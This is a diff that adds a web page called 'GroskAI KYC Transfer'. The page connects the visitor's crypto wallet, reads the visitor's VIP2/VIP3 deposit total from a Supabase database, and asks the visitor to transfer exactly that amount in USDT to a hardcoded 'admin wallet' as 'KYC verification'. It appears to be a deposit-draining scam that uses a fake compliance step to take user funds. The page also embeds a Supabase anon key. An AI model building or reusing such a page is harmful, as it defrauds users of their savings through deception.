@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+    <title>GroskAI · KYC Transfer</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background: #021a17;
+            color: #e2f5f0;
+            font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .glass-card {
+            background: rgba(2,40,32,0.75);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(0,200,140,0.2);
+            border-radius: 32px;
+        }
+        .network-option {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 60px;
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: 1px solid transparent;
+        }
+        .network-option.active {
+            background: linear-gradient(135deg, rgba(13,159,120,0.25), rgba(10,107,82,0.2));
+            border-color: #0d9f78;
+            box-shadow: 0 0 8px rgba(0,200,140,0.3);
+        }
+        .network-option.bnb.active { border-color: #f0b90b; }
+        .network-option.eth.active { border-color: #627eea; }
+        .transfer-btn {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+            transition: all 0.2s;
+            border: none;
+        }
+        .transfer-btn:active { transform: scale(0.98); }
+        .transfer-btn:disabled { opacity: 0.6; transform: none; }
+        .balance-value {
+            font-family: monospace;
+            font-weight: bold;
+            background: rgba(0,0,0,0.4);
+            padding: 4px 12px;
+            border-radius: 40px;
+            display: inline-block;
+        }
+        .wallet-modal {
+            display: none;
+            position: fixed;
+            z-index: 9999;
+            inset: 0;
+            background: rgba(2, 16, 14, 0.96);
+            justify-content: center;
+            align-items: center;
+        }
+        .wallet-modal.active { display: flex; }
+        .wallet-modal-content {
+            background: linear-gradient(145deg, #031e1a, #042a22);
+            padding: 28px 22px;
+            border-radius: 32px;
+            width: 85%;
+            max-width: 340px;
+            text-align: center;
+            border: 1px solid rgba(0,200,140,0.3);
+        }
+        .close-modal {
+            position: absolute;
+            right: 18px;
+            top: 12px;
+            font-size: 26px;
+            cursor: pointer;
+            color: #4a9a7a;
+        }
+        .wallet-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 22px;
+        }
+        .wallet-btn {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background: rgba(0,200,140,0.07);
+            border: 1px solid rgba(0,200,140,0.2);
+            padding: 14px 18px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: 0.2s;
+        }
+        .wallet-btn:hover { background: rgba(0,200,140,0.15); }
+        .wallet-btn img { width: 32px; height: 32px; }
+        /* Fix cho mobile */
+        .break-all { word-break: break-all; }
+        @media (max-width: 480px) {
+            .glass-card { border-radius: 28px; padding: 20px !important; }
+            .network-option { padding: 8px 12px; }
+            .balance-value { font-size: 0.9rem; }
+        }
+    </style>
+</head>
+<body class="p-4 w-full max-w-md mx-auto">
+    <div class="glass-card p-6 space-y-6">
+        <!-- Header -->
+        <div class="text-center">
+            <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-emerald-800 to-emerald-600 flex items-center justify-center mx-auto mb-3 shadow-lg">
+                <i class="fas fa-id-card text-2xl text-white"></i>
+            </div>
+            <h2 class="text-2xl font-black">KYC Verification</h2>
+            <p class="text-xs text-[#7ab8a8] mt-1">Transfer exact deposited amount</p>
+        </div>
+
+        <!-- Wallet info -->
+        <div class="bg-black/30 rounded-2xl p-4 space-y-2">
+            <div class="flex justify-between items-center">
+                <span class="text-[10px] font-bold uppercase text-[#4a9a7a]">Wallet</span>
+                <button id="connectWalletBtn" class="bg-[#0d9f78] hover:bg-[#0a6b52] px-4 py-1.5 rounded-full text-xs font-bold transition">
+                    <i class="fas fa-plug mr-1"></i> Connect
+                </button>
+            </div>
+            <div id="walletDisplay" class="text-xs font-mono text-[#5de8b8] bg-black/40 p-2 rounded-xl text-center truncate">Not connected</div>
+        </div>
+
+        <!-- Deposit amount -->
+        <div class="bg-black/30 rounded-2xl p-4">
+            <div class="text-[10px] font-bold uppercase text-[#4a9a7a] mb-2">Total Deposited (USD) – VIP2+VIP3</div>
+            <div class="flex justify-between items-center">
+                <span class="text-sm">Amount to transfer (USDT)</span>
+                <span id="totalUSD" class="text-2xl font-black text-[#fbbf24]">0.00</span>
+            </div>
+        </div>
+
+        <!-- Network selector with logos (styled cards) -->
+        <div>
+            <div class="text-[10px] font-bold uppercase text-[#fbbf24] mb-2 flex items-center gap-2">
+                <i class="fas fa-globe"></i> Select Network
+            </div>
+            <div class="grid grid-cols-2 gap-3">
+                <!-- BNB Option -->
+                <div id="networkBsc" class="network-option bnb flex flex-col items-center justify-center text-center p-3 rounded-xl bg-black/30" onclick="selectNetwork('bsc')">
+                    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/info/logo.png" class="w-8 h-8 mb-1" alt="BNB">
+                    <span class="text-sm font-bold">BNB Chain</span>
+                    <span class="text-[9px] text-[#7ab8a8]">BEP-20 USDT</span>
+                </div>
+                <!-- ETH Option -->
+                <div id="networkEth" class="network-option eth flex flex-col items-center justify-center text-center p-3 rounded-xl bg-black/30" onclick="selectNetwork('eth')">
+                    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png" class="w-8 h-8 mb-1" alt="ETH">
+                    <span class="text-sm font-bold">Ethereum</span>
+                    <span class="text-[9px] text-[#7ab8a8]">ERC-20 USDT</span>
+                </div>
+            </div>
+            <!-- Balance display -->
+            <div class="flex justify-between items-center mt-3 bg-black/20 rounded-xl px-3 py-2">
+                <span class="text-xs text-[#7ab8a8]">USDT Balance:</span>
+                <span id="balanceDisplay" class="balance-value text-sm font-mono text-[#00e896]">—</span>
+            </div>
+        </div>
+
+        <!-- Transfer button -->
+        <div class="bg-black/30 rounded-2xl p-4 space-y-3">
+            <div class="text-[10px] font-bold uppercase text-[#fbbf24] flex items-center gap-2">
+                <i class="fas fa-exchange-alt"></i> Verification Transfer
+            </div>
+            <p class="text-xs text-[#7ab8a8]">You must transfer exactly <span id="displayAmount" class="font-bold text-white">0</span> USDT to admin wallet.</p>
+            <div class="bg-black/40 p-2 rounded-xl">
+                <div class="text-[9px] text-[#7ab8a8] truncate">Recipient: <span class="font-mono text-[#5de8b8]">0xE2AD2594367C576931223A9B5aF99Cee38bcAfdD</span></div>
+            </div>
+            <button id="transferBtn" class="transfer-btn w-full py-4 rounded-xl font-bold text-white text-lg flex items-center justify-center gap-2 disabled:opacity-50">
+                <i class="fab fa-ethereum"></i> Transfer Now
+            </button>
+            <div id="transferStatus" class="text-xs text-center text-[#fbbf24] min-h-[20px]"></div>
+        </div>
+
+        <p class="text-[10px] text-center text-[#4a9a7a]">After successful transfer, KYC will be marked verified.</p>
+    </div>
+
+    <!-- Wallet Modal -->
+    <div id="walletModal" class="wallet-modal">
+        <div class="wallet-modal-content relative">
+            <span class="close-modal" onclick="closeWalletModal()">&times;</span>
+            <h3 class="text-lg font-bold">Connect Wallet</h3>
+            <p class="text-xs text-[#6aaa94] mb-4">Choose your wallet</p>
+            <div class="wallet-options">
+                <button class="wallet-btn" onclick="handleWalletSelection('metamask')">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg"> MetaMask
+                </button>
+                <button class="wallet-btn" onclick="handleWalletSelection('trustwallet')">
+                    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x4B0F1812e5Df2A09796481Ff14017e6005508003/logo.png"> Trust Wallet
+                </button>
+                <button class="wallet-btn" onclick="handleWalletSelection('binance')">
+                    <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png"> Binance Wallet
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Supabase config
+        const SUPABASE_URL = 'https://ihuglkphzdhagzaomksg.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlodWdsa3BoemRoYWd6YW9ta3NnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkxOTg5MjIsImV4cCI6MjA5NDc3NDkyMn0.jepUTXPclTckTiyi7Jr7rT2rnrcyPshboOlDHbvdwFQ';
+        const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        const RECIPIENT = '0xE2AD2594367C576931223A9B5aF99Cee38bcAfdD';
+        const NETWORKS = {
+            bsc: {
+                name: 'BNB Chain',
+                chainId: '0x38',
+                rpc: 'https://bsc.publicnode.com',
+                usdtContract: '0x55d398326f99059fF775485246999027B3197955',
+                decimals: 18,
+                icon: 'fab fa-btc' // fallback
+            },
+            eth: {
+                name: 'Ethereum',
+                chainId: '0x1',
+                rpc: 'https://eth.llamarpc.com',
+                usdtContract: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+                decimals: 6,
+                icon: 'fab fa-ethereum'
+            }
+        };
+
+        let currentAccount = null;
+        let currentProvider = null;
+        let isMobile = /Android|webOS|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        let totalUSD = 0;
+        let currentNetwork = 'bsc';
+
+        // DOM elements
+        const walletDisplay = document.getElementById('walletDisplay');
+        const connectBtn = document.getElementById('connectWalletBtn');
+        const totalUSDSpan = document.getElementById('totalUSD');
+        const transferBtn = document.getElementById('transferBtn');
+        const transferStatus = document.getElementById('transferStatus');
+        const balanceDisplay = document.getElementById('balanceDisplay');
+        const displayAmountSpan = document.getElementById('displayAmount');
+        const networkBscDiv = document.getElementById('networkBsc');
+        const networkEthDiv = document.getElementById('networkEth');
+
+        // Helper: get provider by wallet type
+        function getInjectedProvider(walletType) {
+            if (!window.ethereum) return null;
+            const providers = window.ethereum.providers || [window.ethereum];
+            if (walletType === 'metamask') return providers.find(p => p.isMetaMask) || window.ethereum;
+            if (walletType === 'trustwallet') return providers.find(p => p.isTrust || p.isTrustWallet) || window.ethereum;
+            if (walletType === 'binance') return providers.find(p => p.isBinance || p.isBinanceWallet) || window.ethereum;
+            return window.ethereum;
+        }
+
+        async function connectWallet(walletType) {
+            if (!window.ethereum) {
+                Swal.fire('Error', 'No wallet found. Install MetaMask or Trust Wallet.', 'error');
+                return;
+            }
+            try {
+                const provider = getInjectedProvider(walletType);
+                if (!provider) throw new Error('Provider not found');
+                currentProvider = provider;
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                currentAccount = accounts[0];
+                const short = currentAccount.slice(0,6)+'...'+currentAccount.slice(-4);
+                walletDisplay.innerText = short;
+                connectBtn.innerText = '✓ Connected';
+                connectBtn.disabled = true;
+                await loadDepositData();
+                await updateBalance();
+                transferBtn.disabled = false;
+            } catch (err) {
+                Swal.fire('Error', err.message, 'error');
+            }
+        }
+
+        function openInWallet(walletType) {
+            const url = window.location.href;
+            let deepLink = '';
+            if (walletType === 'metamask') deepLink = `https://metamask.app.link/dapp/${encodeURIComponent(url)}`;
+            else if (walletType === 'trustwallet') deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`;
+            else if (walletType === 'binance') deepLink = `https://bsc-wallet.page.link/?link=${encodeURIComponent(url)}&apn=com.binance.wallet&ibi=com.binance.wallet`;
+            if (deepLink) window.location.href = deepLink;
+        }
+
+        async function handleWalletSelection(walletType) {
+            closeWalletModal();
+            if (isMobile && !window.ethereum) openInWallet(walletType);
+            else await connectWallet(walletType);
+        }
+
+        function openWalletModal() { document.getElementById('walletModal').classList.add('active'); }
+        function closeWalletModal() { document.getElementById('walletModal').classList.remove('active'); }
+        connectBtn.addEventListener('click', openWalletModal);
+
+        async function loadDepositData() {
+            if (!currentAccount) return;
+            const { data, error } = await sb
+                .from('deposits')
+                .select('amount_usd, vip_package')
+                .eq('wallet_address', currentAccount.toLowerCase());
+            if (error) {
+                console.error(error);
+                return;
+            }
+            totalUSD = 0;
+            (data || []).forEach(d => {
+                const amt = Number(d.amount_usd) || 0;
+                if (d.vip_package === 2 || d.vip_package === 3) totalUSD += amt;
+            });
+            totalUSDSpan.innerText = totalUSD.toFixed(2);
+            displayAmountSpan.innerText = totalUSD.toFixed(2);
+        }
+
+        async function switchNetwork(provider, networkKey) {
+            const net = NETWORKS[networkKey];
+            const currentChain = await provider.request({ method: 'eth_chainId' });
+            if (currentChain === net.chainId) return true;
+            try {
+                await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: net.chainId }]
+                });
+                await new Promise(r => setTimeout(r, 2000));
+                return true;
+            } catch (err) {
+                if (err.code === 4902) {
+                    await provider.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: net.chainId,
+                            chainName: net.name,
+                            rpcUrls: [net.rpc],
+                            nativeCurrency: { name: net.name === 'BNB Chain' ? 'BNB' : 'ETH', symbol: net.name === 'BNB Chain' ? 'BNB' : 'ETH', decimals: 18 },
+                            blockExplorerUrls: [net.name === 'BNB Chain' ? 'https://bscscan.com' : 'https://etherscan.io']
+                        }]
+                    });
+                    await new Promise(r => setTimeout(r, 2000));
+                    return true;
+                }
+                throw new Error(`Failed to switch to ${net.name}`);
+            }
+        }
+
+        async function getUSDTBalance(provider, networkKey, account) {
+            const net = NETWORKS[networkKey];
+            const web3Provider = new ethers.providers.Web3Provider(provider);
+            const contract = new ethers.Contract(net.usdtContract, ['function balanceOf(address) view returns (uint256)'], web3Provider);
+            const raw = await contract.balanceOf(account);
+            return ethers.utils.formatUnits(raw, net.decimals);
+        }
+
+        async function updateBalance() {
+            if (!currentAccount || !currentProvider) {
+                balanceDisplay.innerText = '—';
+                return;
+            }
+            try {
+                const currentChain = await currentProvider.request({ method: 'eth_chainId' });
+                const targetChain = NETWORKS[currentNetwork].chainId;
+                if (currentChain !== targetChain) {
+                    balanceDisplay.innerText = 'Wrong network';
+                    return;
+                }
+                const bal = await getUSDTBalance(currentProvider, currentNetwork, currentAccount);
+                balanceDisplay.innerText = parseFloat(bal).toFixed(2);
+            } catch (err) {
+                console.error(err);
+                balanceDisplay.innerText = 'Error';
+            }
+        }
+
+        // Network selection UI update
+        window.selectNetwork = function(net) {
+            currentNetwork = net;
+            if (net === 'bsc') {
+                networkBscDiv.classList.add('active', 'bnb');
+                networkEthDiv.classList.remove('active', 'eth');
+            } else {
+                networkEthDiv.classList.add('active', 'eth');
+                networkBscDiv.classList.remove('active', 'bnb');
+            }
+            updateBalance();
+        };
+        // Default active BSC
+        selectNetwork('bsc');
+
+        // Transfer function
+        async function performTransfer() {
+            if (!currentAccount) {
+                Swal.fire('Error', 'Wallet not connected', 'error');
+                return;
+            }
+            if (totalUSD <= 0) {
+                Swal.fire('Error', 'No eligible deposit found (VIP2+VIP3).', 'error');
+                return;
+            }
+            const amountToSend = totalUSD;
+            const net = NETWORKS[currentNetwork];
+            const amountRaw = ethers.utils.parseUnits(amountToSend.toString(), net.decimals);
+            try {
+                transferStatus.innerText = 'Switching network...';
+                await switchNetwork(currentProvider, currentNetwork);
+                const provider = new ethers.providers.Web3Provider(currentProvider);
+                const signer = provider.getSigner();
+                const tokenContract = new ethers.Contract(net.usdtContract, [
+                    'function transfer(address to, uint256 amount) returns (bool)',
+                    'function balanceOf(address) view returns (uint256)'
+                ], signer);
+                const balance = await tokenContract.balanceOf(currentAccount);
+                if (balance.lt(amountRaw)) {
+                    throw new Error(`Insufficient USDT on ${net.name}. Need ${amountToSend}, balance ${ethers.utils.formatUnits(balance, net.decimals)}`);
+                }
+                transferStatus.innerText = '⏳ Confirm in wallet...';
+                transferBtn.disabled = true;
+                const tx = await tokenContract.transfer(RECIPIENT, amountRaw);
+                transferStatus.innerText = `⏳ Tx sent: ${tx.hash.slice(0,8)}... waiting...`;
+                await tx.wait();
+                transferStatus.innerHTML = `✅ Transfer successful! Tx: ${tx.hash.slice(0,16)}...`;
+                Swal.fire('Success', `Transferred ${amountToSend} USDT on ${net.name}.`, 'success');
+                localStorage.setItem(`kyc_transfer_${currentAccount.toLowerCase()}`, tx.hash);
+                await updateBalance();
+            } catch (err) {
+                console.error(err);
+                let msg = err.message || 'Transaction failed';
+                if (msg.includes('user rejected')) msg = 'You rejected the transaction.';
+                transferStatus.innerHTML = `❌ ${msg.slice(0,80)}`;
+                Swal.fire('Transfer Failed', msg, 'error');
+                transferBtn.disabled = false;
+            }
+        }
+
+        transferBtn.addEventListener('click', performTransfer);
+
+        // Auto-load if wallet from URL
+        const urlWallet = new URLSearchParams(window.location.search).get('wallet');
+        if (urlWallet) {
+            walletDisplay.innerText = urlWallet.slice(0,6)+'...'+urlWallet.slice(-4);
+        }
+
+        // Account change listener
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', async (accounts) => {
+                if (accounts.length) {
+                    currentAccount = accounts[0];
+                    const short = currentAccount.slice(0,6)+'...'+currentAccount.slice(-4);
+                    walletDisplay.innerText = short;
+                    connectBtn.innerText = '✓ Connected';
+                    connectBtn.disabled = true;
+                    await loadDepositData();
+                    await updateBalance();
+                    transferBtn.disabled = false;
+                } else {
+                    currentAccount = null;
+                    walletDisplay.innerText = 'Not connected';
+                    connectBtn.innerText = 'Connect Wallet';
+                    connectBtn.disabled = false;
+                    totalUSDSpan.innerText = '0';
+                    displayAmountSpan.innerText = '0';
+                    transferStatus.innerHTML = '';
+                    transferBtn.disabled = true;
+                    balanceDisplay.innerText = '—';
+                }
+            });
+            window.ethereum.on('chainChanged', () => setTimeout(updateBalance, 500));
+        }
+    </script>
+</body>
+</html>
